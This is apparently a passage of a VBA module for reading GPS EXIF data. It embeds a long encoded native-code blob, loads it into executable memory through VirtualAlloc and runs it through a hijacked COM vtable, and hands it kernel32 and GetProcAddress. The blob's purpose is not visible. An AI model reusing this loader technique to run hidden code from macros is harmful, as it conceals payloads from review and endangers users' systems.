    NativeCode = NativeCode & "FNi=[Bp\EbDm[RhdPZmAQ O@TnZ_eeZXxQ pKAA][[]oeAkKP[bDwvqqLOUEaS;L;nbJLkrMKXZcPmGGRPj>z_V?\zIS^=ZLKYcM\KUrHyzFAQlHdXBfpVaF;\FJvrmuCUqa\oAupf@Bk_>a^SzSrL OKaY  @=qitKfQm@Oetih=BI=G+++"
    NativeCode = NativeCode & "mcN@OHmX^hfDVtGfpcKbpakuzP?@UhfO_QOm=MmS_yiosAqF_\ b]hCnylSgomEjUgm_THN?MNcT=_omzRt=racWsKOwe=kB\lSX^AYEI@> pA Q?WTHbujOlK]xjDQQ OF=[YPm@^<\Bp=PbdcKBWKornyoNl_kGYjI?z_SGo"
    NativeCode = NativeCode & "SLGEFy[ D_Wq _<[X[eua IyHd^@fDqzdba DEQHN?k\hc?cZlLgPA>GGBqFNo>AK[VFTww xj;Q@m>FW;DSKwIV\lKB?ZQtVwfAUxAttadM=bgzhrOq]>zMmAcAde+++"
    NativeCode = NativeCode & "jB\qCUPrjzeeIwoBZ[hCqUZBe]w_cwRNSEAJWd^UeOvkdtNSdcSdszRafJLLvGrl^Cz\i>c?=tC>oxop@ZoPbELbu@L^l<\YuKfSalMaTd_WYbxC[^S>lCmg\qxzmdPK\viQFXlX?YZ<^EyQ FsyKvub fokoHq[Igt_gUtL>t@OPR_k VEh>kBJGiz>yO"
    NativeCode = NativeCode & "[NLP>vDmiT\Vq oiqS\UhZor kKg;fE[Yay@YIKHVljlYcxyM]C_ZJtBnIQxlpEdJ]ZnYQgPR\CIejpcyaZzwJdQSeDLiltdMM^KZ=eU y<[Vru@PaGsI;vnku[>NZs+++"
    NativeCode = NativeCode & "VIjGfvE;PBfNnDwdaQqxnnqJIFt[Q[k;\zdqehiXa^bCMhVCOlc FWQPWZGTjnxcbXWfoYk B]Igd^y_eFKcD\wmVbYqGUJXoGmt?XgecvCFAYv]tl]raQHecbgtfnjVuOixRsrh]f^JepsN\ndypXzQ+++"
    NativeCode = NativeCode & "sQ[Cd;ZEQ^gPPFpNZFkMx_ZK?RfDCvGuYu;mXVCeHbL DwLurqHb oIE@gb[snhKhM;Fa^JPlah@PNqzM>R[JRhr AFuxpDbeoZ>tSETLo [=AiA=CKQ=LDCWuFLGYWMUvpDEl^\NbIluB>;?]]Us@Z_mVsLSa;[@+++"
    NativeCode = NativeCode & "KQOEveFcjIzQyOeznReutynsPrrBZPmGFJms;JccFlNzDLH+++"
    NativeCode = NativeCode & "ImfllJeoBoM@?BXLVKruta>>C?E]VvSjQm[lX@SEdoOhn_Zl>g[A?Kz??;VV[kPVvsuVx?WkcWgKXcYNG;T UKIJtr VQCKcPVsQGvTGeujBz] ;ISjt?xbhbCQo^blw]MY]sIhn[UDWQhmvSzDyiG ;qxxMn@pqxSuntsQllskdlLr_oip?kMQzfar;_RaBk=R_YFdnAWEDWyT^Q>OYys^QS ^ey+++"
    NativeCode = NativeCode & "Etf\zvLcxRG_ChxQwP^kTc_C;R;gEKvLypyVbXx[MPjcaUL>_N?zT"
    NativeCode = NativeCode & "vq@mItesKD>C[qQcyv A[ib_\qkiW@;@Y@utrE[?]XiB^cQKf]SKJYYWTvv[HvFbNnOTMVG@iWItRRLjMUW_p]x\MyiGlwQvLoI[G=rBklnaS BnQjIlmVEoWAPWKlNPK]vL]szXJp]yblfoMxs=t@fXUxK_UqZNs@?KhuLyXGsXu]fDFdiKHZ]Kiu+++"
    NativeCode = NativeCode & "FwFkp;< hnU;g[^mW>WvY>x ihuMKdZeQ__qss@cyCFWIWooZ[v<^]>][izmt]YtzqFd\l= ni]lVFQoXxwjfYzbeYHrX@ry>DDhrAtGpXUKdqWaxRB\zJaTiBZS OkfH\NsISc LulU"
    NativeCode = NativeCode & "Dvb=yGp?xcM;e pFNjAy[XpIwvem?S@wgWNXQ[YC?Lht_Wlq]DEHH@jT=?Vv]XEzfeMYTC\_SycNagrQHoRhnxbCB>WAtY YwAtjOqa=wwjsVnXVpImHbRzmNYViTRp^?QBcYcmk\CKLmDRfbq[cP?DJCGabM<[ =pXtNuAeCSg@XHeN[mq?ETBsbCy+++"
    NativeCode = NativeCode & "FQmzlM_fjNgx;MtAdctNzDdLAC>Zfl@]TzIaU?rYU?gDeJpP]vp[oKpxoKSuPI_vlbm?\Kjca=qM_p>N>TBmrStvLdbQo;gvEl xZFiWvVG\n@ZB_PpxnFkf_f?pnJqML==PnFcv_P\rfykPJdyLy[ki odYT[DzRkyPbXTA=_DgdUrd\Z? BCDbeNylTEfIwMIt+++"
    NativeCode = NativeCode & "Mj DIxf;hiIaY>KjIpYt[T?JaFaD[FlwoNmg?BSERPvcSBCS\JY p=^QXtn XrGDcxyLWZWXyCas?cs bWkyozi]a^HcdoT@RgkpPqyWx=Bj\KrF[;RzkCbl_@kPjb;IFZPz[LD>\fOvwgd>mAd[gLE=dwoQbKDB]OCNzV _lcv\KkPX;?UOpkMi]WGNiQTGqu z XdlE@jS SydscHMS^jJT[J@W+++"
    NativeCode = NativeCode & "UZ=?kuSFrqtAvEqDbIxd]ujKkulzKrXZweteM=tStP E;;tZlZbOGREfsADtpMn]]b\NxBk PI>bbUzCGjZxfFSWUdvQwQqGZvltyQpLGXAXmDTqNJ_ rfT@CpRuiBDtWIOh?j=Lb?OkHIkHCZ?h"
    NativeCode = NativeCode & "?lU<;TjJFiqNjPRIZI_ftskWHgVIrT?htWPYckpjz[mPCqfFOfwtTvGAyoiQIgXzumRRYPAjMIF<>JFNBXYaEA>qrxvQIrenxpWK<>;PmzTDe=Uz\oHQXn"
    NativeCode = NativeCode & "nHE  T;uiKImKevtIfP]exiJefiNgvUNc_kZkY<lQKkMp@TKhpPDrXqBSEWENIv@XUeKSdAAkjiwYbyba[Mx[INFy[oyNI;gkJItbz Mu\@snUe^Kc\I=BDMSEhN q^oRbpYgKV;XkYE_GhiZpDD@GhEbaGsGUmw\CfTSoC\I;OZAaZtorVgJ_>yD_Lb?;jEdAmiAUYPwredMymf;H+++"
    NativeCode = NativeCode & "skhTHUUsbA?BNegsrUMXXAKBbYTTKzINnZGEkEfnWp^kgaEPGkUkjwZx\MdurZU_wmt_Noke^C^HNtWksT[^Uqj;^yGyP^zc?QzhG[\qDn=nfi[UGS^OFSllldTH"
    NativeCode = NativeCode & "Fze\eq>px;RIAj_r^M?IE;ecr iZJDq=cOUQTyKYymb@YrQDLF?ynTEop[Gpwrecwz@phCpvZQmg Ly_[N>u\NPRWFS kv_PT>A=yaMZUpdAd;e\>SzGOUkNG[V=hGd[]TjCHYsLCxQuvC^>SQf^fD+++"
    NativeCode = NativeCode & "Lhwxg]]bx>CjOle =NuEIYf>;pCKbpibyoaTgbfFOQ=<>zvME[]D?FAri?vmE\IU;ElI=Dqk=JGV^=txOWRAVaqRlc>k"
    NativeCode = NativeCode & "wt>ME^vfn;Yd?mSjyeoXmbSW\N?AoamFnUTd\flV[_VPkEjFEEGgpAP_]IJeSblzLXoQ@mxAeDO>X^BkvOVtqg@GjDz_SEeEUZoq^ M JDmAQPLDvOCNsKboydAXBvtYOGjiSbDZ=AhGz_uTYGh[BbyxawuD^[vhwjqTAPEGbriCISuAugEgo"
    NativeCode = NativeCode & "O JaR _Bjx_CtyF;NJN ]G;@x@MUndIi<_QJU;jtxCj_QhIQEQ_UBmT\v M^basKsoKp\nJaAdre_P ?oFCnZ^\+++"
    NativeCode = NativeCode & ";ip[uyv\ONmF]PMcLTbOnulMpDb@cfvvPZrAsmirNSNrKgSXhUmAvGD>=eP?WU?LOyaeCXJVjH@kZ\Pvg\fRAWjIiVGn\?kdM"
    NativeCode = NativeCode & "IxhvwdRkgZ]DUkXdnpdhtPPkSib[Y_ypYCwwaltMaTqUZYtJVWmIVX OZ\FyKuLgTy=zB;AJDf[IZn^^nWabbQ=yBRJnCRdAfDjun<@IlxWZRpxqlCE=ThuvVPDyjXYr;lG;?wh\?VBAXi?boZUlpkix]ipA\ltISiblQO_a\p[JiN=Qgz_EYvP?Dh;plrNKBIMXkV@Lai+++"
    NativeCode = NativeCode & "nciO_yar]tjZePgr>\Ir@wRHXXHcWc^C>DrwyN ftlnvyDuYSpefqZM^pnQvFjmTnxhrypQsRlVlfQIHI;D jEkobR?LSuP[ZdQEYV\F=WPaWFA\G?uR[vpnrNRmZVMAgDuW=n=_os=AnlYKZzY_nxImv gYe]hCvuZN_XbqcgrtmX@\mDXS+++"
    NativeCode = NativeCode & "Dc?qjoIBbcEWnCOW;ZSy=jy DY\farN^RySdZHnlG]WQtdi_;ASWnSxdQMfrUkjq@uH]WFfC>gLvfuxVUXpZjyVDHBZE^s]WQKp?XB_nMQo;SRmZ[AUH;yeoIUF^TxiMVb_nEevMtlCEGPf>F \=n=flsT[ua=xvYe]MkAMB J;"
    NativeCode = NativeCode & "xhT[MpM;jfTNUfEo[hS\GKwHTiOwj?MCvmr RsPDGDXhAN;Wy?mZKPNFiVwB==KaXqGTr<=O?;rtImPfVIxoqUu^XU_=>YgfS"
    NativeCode = NativeCode & "KRgPam\XDiRFSbKm=N>JJDlBhfwecDzE[s_ZFzV[ j;cDSKWAQ[YstSAg Xx[;wSOpP\lydafYZfyPFMumNAZpkggqD_YBWvBfRoS=>=NVA\ZTK^Jwlp_\u_Gz[ZnCzXWG=YJdF@kMAk]AA;^@mM>gFWqdO]H>y\w^PNMEc^I>kFgfJC"
    NativeCode = NativeCode & "]PoPvIOJcWmWLn[xFQpLXdOaHDHZ<]lcT;itxBIzH RFZq_J=\^tRGkOh_kujBQHl >kgQQTDA@lcdjZ[y vMFcAq=Z]_FE^t_Z ayR[Y>Wcafignxgn\y<_IjySV>WhqmCYMhjeQFWgnEDwKkGCiq^pC[_U?dSAHmXtANVIQq?BhL jpJV>TcIsjePIc?HKXSNkTiypAqPiL@@bJ^@_aD?xL jR>+++"
    NativeCode = NativeCode & "Cpk_swmbFPVW;EQyh X^Rk[vl]u]QfHR@[BZ[h=\>gRLnL]xzOg][QD\FMhcljkdF>J\?_Lqip;ePn]XBnTS>rs\Y]\mFG\Wb_qH@QFz=>;OW= tV==suEMqBiwyp?XTTcdth;aBQW@ESVNnnDv;m^jigvTrsnJ^iQJbwSasBoq[^D@[=MucpWhceAQQeyxlIn^]t=MEVPbfqWhW]Q+++"
    NativeCode = NativeCode & "zRulgT\cTSlcybfc?sLRuvTcUvEYm DOrM;YTGWsxUnEZJLe;nIhR=FORVvFSRVors>hBQlry;xzEJFHRPWErAV]f@;_oO?p]TooCuhHIp_VL_l;YEcZBp>LuoUFRPxWGcdFPQt<"
    NativeCode = NativeCode & "CPu^A\>R >GoK_]YRjLNX=MkHLHa^F[EkuZfeMWQ kghxq?@TE;@t>yd;b;QnH]JMvo_a R^DOSpabmRhh?cIzJzXZqsHjCZ?kxN=jRstO_rbCM oaUzlQAyzxd[w^UfTohDz?GzC=hlD;K[WCl huawwmzmHf]RJZU[f?JAiOheanl zR^[?eKAu?zZMDyiKqexm_wMxicJ=m_bOFbTcDHPiI[Uo+++"
    NativeCode = NativeCode & "ZP]?FGKbC]YoFxlyuniMHQdgm[w?lEGj]inrwIy_U?xwc[kBBA_NM_cNXkTxXA=rVTeXFRLJ\w^v?MO^^h\cZlhrljqnuD>hA"
    NativeCode = NativeCode & "?\MTGbsMn=q>vjRys;gsMV>>QKsVTjqVbclLidUCmXauLpCeYXXSBaNfRBtqyBa_@Go=u=Vrco?H=wgXYrCnxtwYjXArNkyjpfMRGt[oRmuWiQLZD=XiilV^wKIY;w;m gp]WvtX^x]vbbjEAUONJbk^mAxM\h\uhZToq^]cSZarQDlS^BJu=QBETuRqg=AhbtyJfHcuHEocy@[ DgK+++"
    NativeCode = NativeCode & "U _YuqVgFtprgjGhnoB? jT]t^BeozA>Q_RVQZbQZND_ iNTXyyz CK>?nOGYqsdJYurE]OAdrXINdW]tgdS@ YGjhtInIc>TW>k>mcsfIJboJ^af?AXwYmu+++"
    NativeCode = NativeCode & "]FooudEoNNJKH>cbShfIukXkYMnGBQnLRSNKQkVzlGfPL;M;dVO]NtSZmvP\hNtmOZFy]IMpKD^[LS=;ykzkrVV[MAajuuXutmCfaA+++"
    NativeCode = NativeCode & "dnL_ibTHC[rkReHJuP?yDm=;DfKoA_ <]UcnFAjD[SK^yFxhRfNSce^sWsSp_gxdlyIpbNO@iRRdIGBAzwBVuO?C?_Mtpd_ AcgC]zl@Qcp]YpWonqXLPf]iIuQfIob\uTfarv Eaz_b[sIMzVQd+++"
    NativeCode = NativeCode & "OI nI\rRjvFvSILOseJsQIoJrDs?q[iJSEF[up\vNhvU[x^TQfvmLTCqV?CqnMl dVBKve]mQqG[HxJGGwYvmhBbjCupQNU[USI;;ROKT>hJZ[jCGwAlcDh=GSvY\girLJNqzK"
    NativeCode = NativeCode & "uBsjUR@y]DB^Ppa>V ^xknUPjFXIra;L\iskk<_qRbEe_carJjhjwzgtVwR\NL?^cuE>b>]mo;p?=HshecuYvqatAO@_OjSoUj?^amjXhmS\^ncE?nJhHvygMJ\IY[hDVirXO@l?]xsIkr+++"
    NativeCode = NativeCode & "YoE  \uAlm?xNUBrBsCcpvZbIwfDYm_lcq ][yLRSh]VgtLNZch ic>xYYFI qV>B]EILPK]Dwiqdp;AbQ^;bKuxKu ;IJAEdQA_"
    NativeCode = NativeCode & "mUAKg?p>N_jnqwLNl=QYYVzPx[kgI\ZESP\HZxPGhiJex\LS\toktQ>npGjgXErEQxkP>_EMEy];XP?IvBVDG\owh;h@fLg^_u\yHq;G?DUinc;[T^FmqRmUtmHoxuSySo;WtJSgEHgaLCzsS\ccDbt+++"
    NativeCode = NativeCode & "QyVV[kFOjeG xgFzZvnTkPqWWjGbc_MjzQu\wJpr=<\cVzOVnxWRlT=eIQPhbPvW]CuLyKE\dkLodB;KP\wLwxHUE>qlD@lOqmFDeaPQp sVXMZByKpnH@OlaaT?f_GzUeVOK?UI^[XMhVCcj yfj>wkcJRpAqHy]ltV=zU OId_]bFmx=O^sYapRsCVPR;AI\dgiqFj?hAsxR=IovNDv+++"
    NativeCode = NativeCode & "Rj?Iv\xvp@BmIZf]\WGqRI=?mINTRnCUrD=^_FP SQ]RjDOH]ogHrdidhQ@_UYwTnXc]DAHCAz>FXeGyRdrXQussV;iPxrIaKh[YmJuXn=+++"
    NativeCode = NativeCode & "ywlqa;F=@Ca[wpQbEXnCAVnmHAI>ToWg\Sb^MnM?aydD=ST\fZSoLbptmtpRTaZtS^OptzB>RxiW\>\dAXr_[ElHQIB>c svA;hsbOybfkiCY]I"
    NativeCode = NativeCode & "Z_AkK\CnYI@c\euItL JzXyccaMi@@XpjuzE gIzLl>jtGugHaVPX@C>mZqnk;aDPSO=aIq cCY?ubyBAxXVxeBenOUuD[O@bVXnCSJyhxGbBBBse QSWzkVEnGzpvATQWU=SmHvuzX\z>cvhjLygYk[ZxFnRRVyu?oAMOh;hZep[FnMUMgaFVlc+++"
    NativeCode = NativeCode & ">_OMflRV=CgTRVtMJrYmetK;sNME=VPNeDE]mdWGikM^kHUL?g_ychKo?x ?vtZs]KXNsB=Aj[PBK;CufjvLnA]edxq\YgKd?YxPzFT^zvnMOhk>vMmPMZ\"
    NativeCode = NativeCode & " dGu kdsYTcyPqNGtnJzsdj]FHpQ[;LxNb OI[XdFviaDAO[Ysaxrfr=qM?WTdOfR nd\ayeR\[OyXifbnhGDqYGKijLwVAW_DCR[rCV]AJVpsWoEfagRZ>o]?\;^WXqLs"
    NativeCode = NativeCode & "_^jU[GhnoS sfvAbO>iIEIlPvrEoKoPLlxLZSKGARakOiUpKb>hSiDQOVOxefCPRQCL qGBxuPPEuRb^B[eIUnXVVZERlhg]X[yPhZxSjdQW=wZeIM[dJnZWIFKKMSPW=FrHEFZAQ[Un]_CIHlXGNDwap?bcCQA@AwbO?hF;NMPnbTtC;Ed\UCgo\KG_EG"
    NativeCode = NativeCode & "LDEK=OXnxSKYhc\tyP;Ki;cmM@[Eo=?QgzaaSP;>uipEKWnIEzx\TCUc@U\ARqeHHkTgZ=>]TDD]WFnnu@SUSAwoL_?jAiNNg?y^OeTTme;;^NApFXgVDq[ip?@VY@Lkoq[yEHvBQL+++"
    NativeCode = NativeCode & "MsNXNbaavZDbrQVqVEIRKCy>]?\rN@lRCsA=DXQp[pvn UIQc\OLKsDcQyV\eDwq[UFbTE k]WGyZh?KKj\R_;f bRBlA^fbP?FiwOqr_LxTAjdnGMC+++"
    NativeCode = NativeCode & "FkJMrnyoSI?WwgnaNm@fpfBiQMvxNFJK_PWubkodo^@ vIxMtNHgyvwyMK\kfxluKcYj[^Tjvc P]wsusGAMbqesaz=GBXI;ZurxEvwbXJ^aPCjT<];Zxhhl?p\\VKKuWBZyLvdoY>Rad Zgu>FFyImEASS?hOx@h HPUaiYTsp>IJPlQlTKwfz?mWgCdouAK+++"
    NativeCode = NativeCode & "CWSj>Cio_aJ>wyotziuayKPq\Mqdq__p;R\@G=kol;LXtj^zq^MbXDI> ;AMxrd>^KCcmEZmHCrrDA=wH\W;EsHq_UNHqhSptayhjKNbCwrDSjBy]F;NrPx[aFLITexvHGPgBGo;^>KOg^qrL]?zl>a\>^x]dcMmSQScwqF_j+++"
    NativeCode = NativeCode & "=cNxoIPAFi?cAaaE@NbPkOesWBWNcVwx_VArZRr>Q@qkJD[CNccYjhsSGDF?ju]p?clCFAek_KpGEidboKtjCJFrZTGxlS\ZeT<@MmUaCxztc_pt?VpY_EqH^EAmVm<< FC?HBPUnjdPF[TGRmhlCsdCwZIeFdlnrhvxd ;I\_vQDl@OOcuQQhczZMVvPeIyMtZIV=h"
    NativeCode = NativeCode & "dQKKYU>TB=It_Y@EuO\P;hEQpBw =azzcH[yR^PlzEOkUEvDqO MSX=;mYCGiVUuomGCFkg@I_ncXsmvA?W?IoEs\_@FtlMrjeRhpFjIysLXhRtzoPkG=PjRKIY;oD"
    NativeCode = NativeCode & "qmcgA[b>qQxAWN?UFFrKqy_^]D@S]?kzlh;X@\K=^gED;zquDFLAH?ELbXb?>zrCN^CxVfNdE NEMQL_y OIkB P@uP\D@ge C LAJvde@PfuRqotzUGTNQEtdS+++"
    NativeCode = NativeCode & "LuoDymIPPs? bn xegxGm?cju?pZaaPDrDeODWfRTzVLfKdMwfD\D=glSbHkInyQIcxXXt[XujkHVjiFVl=>Fj?BKQ_sCViQYrkeU^lALYawRCzsvoZIAV];_XibwNwvkGCfmxKnp;;SwwVcUo?WKA\QOyQNJgzN?KGn[pdM[KgkQQgHQ>njOjRe?VJq;s"
    NativeCode = NativeCode & "Ju\?fKN?gV\Sc;g_sLi\tqQiGWXZXy?dXY_mQRklp_Lm>PHQACEUycii_MGpQMVj^KyrLWLMnGvTuiYhiKpMlpjQ=CGylU@j@FzEbM@QeKQ>K^nbdBYjj@HEshCf roPeDgILYqPatjbLrsG^u >EGtWIjXb>g^wi+++"
    NativeCode = NativeCode & " EIuD=fZEXlIaXkFeifTwW fezXtLZsC^qqPvtMBZJ??coXV wnNXXk>YpaM^zUVS[[AsWye?hkT>_rs\tj"
    NativeCode = NativeCode & "wWzD>pBOUJqiqWtmaUE?VcWl;^]SN^Ck>mMx]Tf;XnNXGja^QQuN_etBdLR q\r@dsRqd^U]vmauYzxg>;yVCd"
    NativeCode = NativeCode & "uRDCbgJ>pzB@Yd]ccIi VmwV?HYhkXjRQCS=gQYfQXXHdeZ]NMSJryDncTnLCoEvh"
    NativeCode = NativeCode & "=KeyBg>^NOYGv[CJVYsrDFw^l?Viva="
    NativeCode = NativeCode & "O xUTfIzaZx vO_@XZrOVqCZmjmyvNG_Hat]wuoO^OImCDPqN>CPalXvc;_zX=IuXObNcOtuWmxTFaqqgd[]XPsMrjWvwBsDIa\AxyJdfs>KCEi;npQ@gzSe^pmNjmPf^fiP>v@Zjd\A?tHIttpa@XSgbNrdsgieCgWisLUOt[ZTtBYf;hnybiE^EKsHH\k+++"
    NativeCode = NativeCode & "gSEMbjvmWCoCv>sfsUfF\fH[khA]ZQaQrc?@ssEDFl^kcwlTXRsVsg\>vS>uG^oBJd@TakEw\FkS\^Y[cTckz\[aJcjR[tRuyPWAxJRGJD>iwfH?p\^KqVy; GSYWzalgyTYJfPQhq@U@meY@@?yqUfvth+++"
    NativeCode = NativeCode & "DNGWBVr_QeTT_S>FWA]kGowP\E vWcGR?YOzze Tc]tj[etA_NmX\ibzb_ssiWOW_zLTWxnzfIUaq\PSA]i]VCG^zCLtDBTx=hfBCQ;SfQhRsaW xvrwNXfzVJTAhti Tw]n=tB\vaBUDaeMNsBD=jURGDcKOJth@oyRmwWIEUz_+++"
    NativeCode = NativeCode & "?kmesbvvPtdS_TV>lDfe s^OX>pButaz\SPFvA\vSVK\KA=GPvkfI^VjB[;H\THtt^=U[ECyczj;ajSl OVKpSIJMlwy>erLOzVAt]IRm?VBWFyc=QjtgaOpyZN^ >\vSJNbz"
    NativeCode = NativeCode & "df@orA^sYyCRWIHVJZmdR\PCyBSs>Ca?\xxNwA?pEmqnE]GH?X>N]Dd[GSUf?\qN^rf\DfWmyM>fEWZmdQJpz?]LNTlx;tIOhRwkqM>WDqR ]ZIDi>dPSXSVAU>MMXhgabPaWv^PayEXZCn_JOrmEP] jMtOsVdSeoL^ JCtJM=ZyEj[jeKyxeo"
    NativeCode = NativeCode & "uSzg^jxyta_WelaCdK\C_[u<@=P;S;guxE\DVd?QgMTH F>nKuO[m]]ktByUGBWSAJaZw?yEyTPdEgL?IPaGYeIpsZRkDAnot=CTsXyKVwV>SAJKAkuRCMSk^kd>\GJeG>rb[;GK=r>TLXrG]G=Dz_cyHrFKgtsUi@VMUksHkl_+++"
    NativeCode = NativeCode & "zi_FP?fMSctyX^Vzpsxdqvmk_Qffzyy@hcgSU_fw=RaG\Y;OaciQuxWMVL=RxjImNy<[TVTjrIumgx;ZJxLN_pH\Fl?QoR>BUivwgReSzO;oa<=RTlHu"
    NativeCode = NativeCode & "k? lV?W[isVWgLdv>=WUaSPN?dmgcmtxkAM>;RUNpr ix[naj?coLYc[sjzop[DLiKt\mbQRc_FyTs?ZFeJCsHecg?TNEX]u^OSq@X[ChNOgFoAT?f><>LNLf=Z=SreU=KpvHP^rWEGrNNxaoI"
    NativeCode = NativeCode & "cFBDXwncC;g_D\Wtsw\zJS?A?JaVvqSGoJzbkXInWOFH=c[ZaDwbA>]EmjEML Cck]>TYGZtv<^G\bfIrLWI\hjJOI^@za[LHr >?P\O@a]thDLatqQn\d ?;YwaciqyFF^i?ZCW"
    NativeCode = NativeCode & "tlWVjTvc]IrZ?eTU\jpFcf?YDsrfAfozkRk\PaFcQm_MWIryauibV]uZ R[PKXRII^htB]YN>BeSjD C\TtSY^vquw?>WOQWX+++"
    NativeCode = NativeCode & "wdbrBscdYY@yMbiv]YjKMjS]nUXyRqqv_jzL@XTh?vTvglfsHr<^PCXlqLAMhoBkI]\Ew;rUcxhjUENVNKsBGH@WtKriJqy[AIA;vMlQK=@[IK?i=UXBM^\uqBsAsU\y[TprQo^ uMYIXbvM[VnkAQefBcfeeaIgXguxmFZMwh[mL\ItNnqZP;XB_U+++"
    NativeCode = NativeCode & "p@s]>FkRh]XS[?a^UmfT\^iSn^Qm;fDEbDCYIEuBBpuwlkQxa=;J odEfiUeBsoXbFus\SWI _cGb\iQIon=hWxUUDa=^IGd^GoK]DlSCH^CJG\mQ<+++"
    NativeCode = NativeCode & "Jm\VvFOzFNtTiNBpILhLdzUq@KoCT>gsne_j[YZEXe@IpI@[ ^lGoucGVjMNLzNqzXIDtrgN?^j_eDuLseldmH_gK;PkyozWduJPvHHmyUnQ=^aI;\hoSCNLUS;aiSf_Z UhaYTN >DV@IGJvJNHEnU ms;cP \U D WFBB Kd]pgNyDoM_ggp"
    NativeCode = NativeCode & "l>DsSjbohrYjxvvfghVwnMcD]U\TauSy;RPTJkQ]QxF=uF\ZA=uvPYt nVH_\ajV_@la=Wx\^OY@yb\aJq[PUwD^hJnAbz;^?zIUm=@aJaHOZXNwHora c]NIrox]GoS QC@O[djefCv@xrwaFxWSz@hbCyxj\^WwYFA[ZDsTU;i]pNGarGjnZgp BQ\=pny]H_Dz;b"
    NativeCode = NativeCode & "WsxFHaXbmerN]bCq;BzQz;Nwgxtxn@wmX_jR[dYYPKDMbrwcELY"
    NativeCode = NativeCode & "bSIdu^ssxybdPHUi^Et>GEZnZCmQcXs+++"
    NativeCode = NativeCode & "kM]PLj=moM@m\zwcc]@?TS_BokC@RcEWe=jj>BZHSRMLki=CS_^RppcK>mAybWSX IUWE_kDtiRSHneUpqbM@r\N_B\quuTVbKuRXge>[sv=hAHwn_?Tvf_FI sxnOjiJ  Ena+++"
    NativeCode = NativeCode & "SOJakYPS=@[\ cBViq?MeFJmJ>u ayA_BzFGyi\\j;Y=ix@ea?^=zxoB"
    NativeCode = NativeCode & "knC AG_ktQf??ACv=[q=;_AsK?iyfZKkdD ;xja\V^NyjPoLbJL\Kle]YQBctr;DXcpD TNzWhPuTWRo\LoxgmsVpjKiw]vVtG;OkD TpjKnNS]C^yLe@ixnPSPCSPCjgzTN^oj\eDdUPHwOYRTKhmrKUFWzI;HD^gCqd\DiXd^[@_Rz<+++"
    NativeCode = NativeCode & "kkorwE@ndFvqTX>=QGlbuN]X?UDkI]jLES CzXrmUuaojL=_EH\GZoUE_hTob^enE;XDRan=@UABRYWM>Ec[ivjjgZoBDEHGJvFVuwrjV;lVgXs_QgPCJm>ll FWW[?JKQBELhER\OIxHnPJabObyGYaC@iall>^I[PsvB[zb^cpYtJB?O=UFkAS[U]OtOJ\]amXLOaJx+++"
    NativeCode = NativeCode & "UxLTdlM]ApMPxyMl=n]lXpL WGiSoV>AbugfKViPIbO=Q>BB[Bkmq]lBTWJwaEq_< KpEGqKfSm suunW?pufb[RE;xVoFOBmqWRwbpLgJhuiPvdgyo>x[dL?ypspd=R\LCknDAkM+++"
    NativeCode = NativeCode & "sB_yywd^Wkk\qW^qRh;nae]BOGIOJ]sY?gwGWL]?@hG;?VOeGI\g;IkR\WxkaO_snMhHdXPShk\Ay\O[DVu\OQRr aDipkcqdUH]Zu iOrnfgJGBd@\OCakkli^oc;]BRaAcd_HAY hjJet+++"
    NativeCode = NativeCode & "M?RQAjUA\wTRHVFqSWzJ^@AgifcIWzpXaaYe=Gbh[TD;s KDM]Vkt HXTXgF;Ut^DLpO@AICtTYsfQ>CuwKcbm_RV_lFRy;rkZCtbJeXWHaUC=I>]xUzHLk=IMzKgApoS[a=aAUuc_DTCNGWbMQEwQREBlg[CcM=\=Gikisjb\lv>mFmiBKc]]iRWjqOId+++"
    NativeCode = NativeCode & "sJiElv_\BxPEdhx@[RuJzz\[RsWxJxMfvb>@MN[rZKhmDw_^SLJm^pBVqnUn^YR]dFBbT=TqaAiB^ibBy[]sfJlmUtQPnJGc]xzPC?_oh@DDGwYWXNvhrHSixhI=_fqfiVGamOoC\Oc]KcWW_]=Zm_VxGNvNLnLx+++"
    NativeCode = NativeCode & "EFNSMNRwqeHkVSniAuHYhF_ ]]FZwln lbgTrrhPNRg@dVkVjz?yBPYP srugfKyCKE;bvuqthvceScGkBFWpHGCw^lSKIQFcP>ps@USR][lFULEsA"
    NativeCode = NativeCode & "HqwU]CeebRjd]VyjMj;oFj;A?0"
    NativeCodeAddr = VirtualAlloc(0, Len(NativeCode) + DECOMPRESSED_EXT, MEM_RESERVE_AND_COMMIT, PAGE_EXECUTE_RW)
    If NativeCodeAddr <> 0 Then
        Call CopyMemoryAnsi(NativeCodeAddr, NativeCode, Len(NativeCode))
        LoaderVTable.QueryInterface = NativeCodeAddr
        LoaderVTablePtr = VarPtr(LoaderVTable)
        LoaderObj = VarPtr(LoaderVTablePtr)
        Call CastToObject(ClassFactoryLoader, LoaderObj, SIZEOF_PTR)
        Ignore = TypeOf ClassFactoryLoader Is VBA.Collection
        Set m_ClassFactory = (ClassFactoryLoader)
        Kernel32Handle = GetModuleHandleA("kernel32")
        GetProcAddressPtr = GetProcAddress(Kernel32Handle, "GetProcAddress")
        With m_ClassFactory 'older code
            Call .Init(Kernel32Handle, GetProcAddressPtr, OPTION_BASE + OPTION_FLAGS, NativeCode, New GPSExifReader_Helper)
            Ignore = TypeOf .vbExifProperties Is GPSExifProperties
        End With
    Else
        Err.Raise ERR_OUT_OF_MEMORY
    End If
End Sub
Function OpenFile(ByVal FilePath As String) As GPSExifProperties
    Set OpenFile = m_ClassFactory.OpenFile(FilePath)
End Function
Function BrowseAndOpenFile() As GPSExifProperties
    Set BrowseAndOpenFile = m_ClassFactory.BrowseAndOpenFile()
End Function

